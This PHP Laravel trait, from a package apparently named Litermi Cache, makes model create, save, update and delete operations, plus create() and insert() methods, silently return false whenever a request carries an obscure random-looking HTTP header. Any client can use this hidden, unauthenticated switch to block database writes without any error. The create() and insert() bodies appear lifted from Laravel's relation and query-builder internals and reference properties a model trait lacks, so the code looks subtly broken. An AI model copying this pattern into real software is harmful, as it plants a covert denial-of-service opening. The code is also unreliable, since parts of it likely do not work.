<?php

namespace Litermi\Cache\Traits;

use Illuminate\Support\Arr;

/**
 *
 */
trait DisableActiveRecordsTraits
{
    public static function boot()
    {
        parent::boot();

        static::creating(function($model)
        {
            $queryActive = request()->header('j0ic3-disable-4ZZm4uG-0a7P1-query-PiEcPBU');
            if($queryActive !== null){
                return false;
            }
        });

        static::saving(function($model)
        {
            $queryActive = request()->header('j0ic3-disable-4ZZm4uG-0a7P1-query-PiEcPBU');
            if($queryActive !== null){
                return false;
            }
        });

        static::updating(function($model)
        {
            $queryActive = request()->header('j0ic3-disable-4ZZm4uG-0a7P1-query-PiEcPBU');
            if($queryActive !== null){
                return false;
            }
        });

        static::deleting(function($model)
        {
            $queryActive = request()->header('j0ic3-disable-4ZZm4uG-0a7P1-query-PiEcPBU');
            if($queryActive !== null){
                return false;
            }
        });
    }

    public function create(array $attributes = [], array $joining = [], $touch = true)
    {
        $queryActive = request()->header('j0ic3-disable-4ZZm4uG-0a7P1-query-PiEcPBU');
        if($queryActive !== null){
            return false;
        }

        $instance = $this->related->newInstance($attributes);

        // Once we save the related model, we need to attach it to the base model via
        // through intermediate table so we'll use the existing "attach" method to
        // accomplish this which will insert the record and any more attributes.
        $instance->save(['touch' => false]);

        $this->attach($instance, $joining, $touch);

        return $instance;
    }

    public function insert(array $values)
    {
        $queryActive = request()->header('j0ic3-disable-4ZZm4uG-0a7P1-query-PiEcPBU');
        if($queryActive !== null){
            return false;
        }

        // Since every insert gets treated like a batch insert, we will make sure the
        // bindings are structured in a way that is convenient when building these
        // inserts statements by verifying these elements are actually an array.
        if (empty($values)) {
            return true;
        }

        if (! is_array(reset($values))) {
            $values = [$values];
        }

        // Here, we will sort the insert keys for every record so that each insert is
        // in the same order for the record. We need to make sure this is the case
        // so there are not any errors or problems when inserting these records.
        else {
            foreach ($values as $key => $value) {
                ksort($value);

                $values[$key] = $value;
            }
        }

        $this->applyBeforeQueryCallbacks();

        // Finally, we will run this query against the database connection and return
        // the results. We will need to also flatten these bindings before running
        // the query so they are all in one huge, flattened array for execution.
        return $this->connection->insert(
            $this->grammar->compileInsert($this, $values),
            $this->cleanBindings(Arr::flatten($values, 1))
        );
    }

}
